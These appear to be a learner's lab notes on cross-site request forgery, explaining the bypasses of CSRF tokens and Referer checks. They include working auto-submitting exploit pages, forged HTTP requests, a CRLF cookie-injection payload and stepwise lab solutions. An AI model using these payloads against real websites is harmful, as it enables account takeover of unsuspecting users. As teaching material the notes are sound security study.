                                                  ## What is CSRF?
# Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.
# It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other. 
# In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally.
# For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. 


                                                ## What is the impact of a CSRF attack?
# In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. 
#  For example, this might be to change the email address on their account, to change their password, or to make a funds transfer.

                                           ## How does CSRF work?
# A relevant action.
-------> There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password). 

# Cookie-based session handling.
--------> Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests.
--------> There is no other mechanism in place for tracking sessions or validating user requests. 

# No unpredictable request parameters.
---------> The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess.
---------> For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password. 


                                            <html>
                                                <body>
                                                <h1>Hello World</h1>
                                                <iframe style="display:none" name="csrf-iframe"></iframe>
                                                    <form action="https://vulnerable-website.com/email/change" method="POST" target="csrf-iframe" id="csrf-form">
                                                        <input type="hidden" name="email" value="pwned@evil-user.net"/>
                                                    </form>
                                                    <script>
                                                        document.forms[0].submit();
                                                    </script>
                                                </body>
                                            </html>
                                            
                                            
                                            
                                           <html>
                                              <body>
                                              <h1>Hello World</h1>
                                              <iframe style="display:none" name="csrf-iframe"></iframe>
                                                  <form action="https://0af1001404f9a5cec0cc0650006c006b.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf.form">
                                                      <input type="hidden" name="email" value="suleshyjr@user.net"/>
                                                  </form>


                                                  <script>document.getElementById('csrf.form').submit()</script>
                                              </body>
                                          </html>
                                          
                                          
 #  If a victim user visits the attacker's web page, the following will happen: 
 
 ------> The attacker's page will trigger an HTTP request to the vulnerable web site. 
 -------> If the user is logged in to the vulnerable web site, their browser will automatically include their session cookie in the request (assuming SameSite cookies are not being used). 
 --------> The vulnerable web site will process the request in the normal way, treat it as having been made by the victim user, and change their email address. 
 
 
                                               ## Common CSRF vulnerabilities
                                               
# In the previous example, suppose that the application now includes a CSRF token within the request to change the user's e-mail: 

                                        POST /email/change HTTP/1.1
                                        Host: vulnerable-website.com
                                        Content-Type: application/x-www-form-urlencoded
                                        Content-Length: 68
                                        Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

                                        csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&email=wiener@normal-user.com
                                        
# The application no longer relies solely on cookies for session handling, and the request contains a parameter whose value an attacker cannot determine. 
# However, there are various ways in which the defense can be broken, meaning that the application is still vulnerable to CSRF. 


                                      ## Validation of CSRF token depends on request method
# Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used. 
# In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack: 


                                          GET /email/change?email=pwned@evil-user.net HTTP/1.1
                                          Host: vulnerable-website.com
                                          Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
                                          
                                          
                                          
                                      
                                             <html>
                                                <body>
                                                <h1>Hello World</h1>
                                                <iframe style="display:none" name="csrf-iframe"></iframe>
                                                    <form action="https://0a8300cf04b48be2c09712be00300043.web-security-academy.net/my-account/change-email" method="get" target="csrf-iframe" id="csrf-form">
                                                        <input type="hidden" name="email" value="suleshy@user.net"/>
                                                    </form>


                                                    <script>document.getElementById('csrf-form').submit()</script>
                                                </body>
                                            </html>
                                            
 
                                                     ## Validation of CSRF token depends on token being present
                                                     
# Some applications correctly validate the token when it is present but skip the validation if the token is omitted. 
# In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack: 

  Example:                                        POST /email/change HTTP/1.1
                                                  Host: vulnerable-website.com
                                                  Content-Type: application/x-www-form-urlencoded
                                                  Content-Length: 25
                                                  Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

                                                  email=pwned@evil-user.net
                                                  

                                                 ## CSRF token is not tied to the user session
                                                 
# Some applications do not validate that the token belongs to the same session as the user who is making the request. 
# Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool. 
# In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack. 


                                                ## CSRF token is tied to a non-session cookie
# In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions.
# This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together: 


                                            POST /email/change HTTP/1.1
                                            Host: vulnerable-website.com
                                            Content-Type: application/x-www-form-urlencoded
                                            Content-Length: 68
                                            Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

                                            csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com


# This situation is harder to exploit but is still vulnerable. If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible.
# The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 

Example:    /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
--------->  <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a81008c032fb4d9805b1cc500e600c9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="dd48&#64;carlos&#45;montoya&#46;net" />
      <input type="hidden" name="csrf" value="EnvPPMJqISUWdxhLDPsygzpZ2VGFbXHa" />
      <input type="submit" value="Submit request" />
    </form>
<img src="https://0a81008c032fb4d9805b1cc500e600c9.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=BbpeUsPd6MDGmQ0FBx6M5EsoFe92tolI%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>


        
                                            ## CSRF token is simply duplicated in a cookie
                                                                                            
#  In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter.
#  When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie.
#  This is sometimes called the "double submit" defense against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state: 

         
                                  POST /email/change HTTP/1.1
                                  Host: vulnerable-website.com
                                  Content-Type: application/x-www-form-urlencoded
                                  Content-Length: 68
                                  Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

                                  csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
                                  
# In this situation, the attacker can again perform a CSRF attack if the web site contains any cookie setting functionality. 
# Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 


                                            
                                            
                                            ## Referer-based defenses against CSRF
                                            
#  Aside from defenses that employ CSRF tokens, some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This approach is generally less effective and is often subject to bypasses.

                 ## Validation of Referer depends on header being present
# Testing the referer header for csrf attack
---> Remove the referer header, Example:

                        <html>
                          <!-- CSRF PoC - generated by Burp Suite Professional -->
                         <head><meta name="referrer" content="never"></head>
                          <body>
                          <script>history.pushState('', '', '/')</script>
                            <form action="https://0aaf0025046027f6c06226fe00cb00bf.web-security-academy.net/my-account/change-email" method="POST">
                              <input type="hidden" name="email" value="suleshy1&#64;normal&#45;user&#46;net" />
                              <input type="submit" value="Submit request" />
                            </form>
                            <script>
                              document.forms[0].submit();
                            </script>
                          </body>
                        </html>
                        
                                    ## Validation of Referer can be circumvented
               
# Some applications validate the Referer header in a naive way that can be bypassed. 
------> For example, if the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain: 

Examples: http://vulnerable-website.com.attacker-website.com/csrf-attack 

# Likewise, if the application simply validates that the Referer contains its own domain name, then the attacker can place the required value elsewhere in the URL: 
  
  Example: http://attacker-website.com/csrf-attack?vulnerable-website.com
  
--------> Include the following HTML to suppress the Referer header: <meta name="referrer" content="no-referrer">



# Lab: CSRF with broken Referer validation

STEP 1: Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. The result should look something like this: 
-----> Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net

STEP 2: Send the request and observe that it is now accepted. The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string. 

STEP 3: Create a CSRF proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab and host it on the exploit server. 
        Edit the JavaScript so that the third argument of the history.pushState() function includes a query string with your lab instance URL as follows: 
------> history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")

# This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier. 

STEP 4: If you store the exploit and test it by clicking "View exploit", you may encounter the "invalid Referer header" error again.
        This is because many browsers now strip the query string from the Referer header by default as a security measure. 
        To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section: 
----->  Referrer-Policy: unsafe-url













           

                                                  
                                                  
                                                  
                                                  
 
 
 
